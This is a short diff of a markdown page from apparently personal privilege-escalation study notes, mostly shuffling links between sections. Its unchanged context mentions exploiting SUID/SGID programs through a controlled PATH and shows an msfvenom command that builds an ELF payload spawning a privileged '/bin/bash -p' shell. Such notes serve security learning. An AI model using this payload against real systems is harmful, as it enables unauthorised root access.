@@ -29,6 +29,8 @@ Note that this is *almost* identical to the LD_PRELOAD trick; the differences ar
 
 A simple binary like this is useful for exploiting SUID/SGID applications that call other executables from part of the PATH that we control.
 
+* [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
+
 ## Metasploit
 
 The msfvenom tool can generate binaries with essentially the same functionality as above.
@@ -38,8 +40,4 @@ msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf \
          -o shell.elf
 ```
 
-## References
-
-* [TryHackMe: Complete Beginner](tryhackme-complete-beginner.md)
-* [Exploiting LD_PRELOAD](exploiting-ld-preload.md)
 * [Using Metasploit](metasploit.md)
